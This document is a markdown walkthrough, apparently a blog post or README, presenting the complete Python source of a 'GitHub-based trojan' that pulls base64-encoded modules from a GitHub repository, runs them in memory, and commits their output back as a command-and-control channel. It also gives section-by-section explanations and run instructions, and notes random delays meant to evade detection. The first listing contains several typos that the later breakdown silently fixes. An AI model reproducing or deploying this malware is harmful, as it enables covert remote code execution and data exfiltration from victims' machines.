This script is a **GitHub-based trojan** designed to dynamically load and execute malicious Python modules from a GitHub repository. Below is a detailed explanation of its components.



```python
import json
import base64
import sys
import time
import importlib
import random
import threading
import queue

from github3 import login

trojan_id = "abc"
trojan_config = "config/{}.json".format(trojan_id)
data_path = "data/{}/".format(trojan_id)
trojan_modules = []
configured = False
task_queue = queue.Queue()

class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print(f"[*] Attempting to retrieve {fullname}")
            new_library = get_file_contents(f"modules/{fullname}")
            if new_library:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        module = importlib.util.module_from_spec(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module
        return module

def connect_to_github():
    gh = login(username="your username", password="your password") # 2FA accounts: replace password= with token="your token"
    repo = gh.repository("your username", "repository name")
    branch = repo.branc("master")
    return gh, repo, branch

def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            print(f"[*] Found file {filepath}")
            blob = repo.blob(filename._json_data["sha"])
            return blob.content
        return None

def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    configuration = json.loads(base64.b64decode(config_json))
    configured = True

    for tasks in configuration:
        if tasks["module"] not in sys.modules:
            exec(f"import {tasks['module']}")

    return configuration

def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = f"data/{trojan_id}/{random.randint(1000, 100000).data}"
    repo.create_file(remote_path, "Commit message", data.encode())
    return

def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    store_module_result(result)
    return

# main loop
sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))
    time.sleep(random.randint(1000, 10000))

```


# **🛠 Code Breakdown**

### **1️⃣ Import Required Modules**
```python
import json
import base64
import sys
import time
import importlib
import random
import threading
import queue

from github3 import login
```
- **`github3`** → Used for interacting with GitHub repositories.
- **`queue`** → Manages task execution order.
- **`importlib`** → Dynamically loads Python modules.
- **`base64`** → Decodes modules retrieved from GitHub.

---

### **2️⃣ Trojan Configuration**
```python
trojan_id = "abc"
trojan_config = "config/{}.json".format(trojan_id)
data_path = "data/{}/".format(trojan_id)
trojan_modules = []
configured = False
task_queue = queue.Queue()
```
- The **trojan ID** (`abc`) determines which configuration file to load.
- The **configuration file (`config/abc.json`)** lists modules to load.
- The **data path (`data/abc/`)** is used for storing execution results.
- The **task queue** manages module execution order.

---

### **3️⃣ GitHub-Based Module Importer**
```python
class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print(f"[*] Attempting to retrieve {fullname}")
            new_library = get_file_contents(f"modules/{fullname}")
            if new_library:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        module = importlib.util.module_from_spec(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module
        return module
```
- **Dynamically retrieves Python modules** from GitHub.
- **Base64 decodes and executes the code** in memory.
- **Loads retrieved modules into `sys.modules`**.

---

### **4️⃣ GitHub Connection Functions**
```python
def connect_to_github():
    gh = login(username="your username", password="your password")
    repo = gh.repository("your username", "repository name")
    branch = repo.branch("master")
    return gh, repo, branch
```
- **Logs into GitHub** using credentials (or a token).
- **Connects to a specified repository and branch**.

---
```python
def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            print(f"[*] Found file {filepath}")
            blob = repo.blob(filename._json_data["sha"])
            return blob.content
    return None
```
- **Searches for a file in the repository**.
- **Retrieves its contents as Base64-encoded data**.

---

### **5️⃣ Loading the Trojan Configuration**
```python
def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    configuration = json.loads(base64.b64decode(config_json))
    configured = True

    for tasks in configuration:
        if tasks["module"] not in sys.modules:
            exec(f"import {tasks['module']}")

    return configuration
```
- **Retrieves and decodes the JSON configuration file**.
- **Dynamically imports specified modules**.

---

### **6️⃣ Storing Execution Results**
```python
def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = f"data/{trojan_id}/{random.randint(1000, 100000)}.data"
    repo.create_file(remote_path, "Commit message", data.encode())
    return
```
- **Saves execution results back to GitHub**.
- **Creates a random filename for each result**.

---

### **7️⃣ Running Modules**
```python
def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    store_module_result(result)
    return
```
- **Executes the `run()` function of each loaded module**.
- **Stores the output in the GitHub repository**.

---

### **8️⃣ Main Execution Loop**
```python
sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))
    time.sleep(random.randint(1000, 10000))
```
- **Uses `GitImporter()` to dynamically import modules**.
- **Loads configuration and executes tasks in threads**.
- **Runs continuously with random time delays** to avoid detection.

---

# **🚀 How to Run**
### **1️⃣ Install Dependencies**
```sh
pip install github3.py
```

### **2️⃣ Configure GitHub Repository**
- Create a **GitHub repository**.
- Store the **trojan configuration (`config/abc.json`)**.
- Store **Python modules (`modules/`)** in Base64 format.

### **3️⃣ Execute the Trojan**
```sh
python trojan.py
```

---

# **🔥 Why is This Dangerous?**
✔ **Uses GitHub as a Command & Control (C2) server**.  
✔ **Dynamically loads and executes code** in memory.  
✔ **Stealthy—runs in the background with random delays**.  
✔ **Can be used for data exfiltration or executing malicious payloads**.  

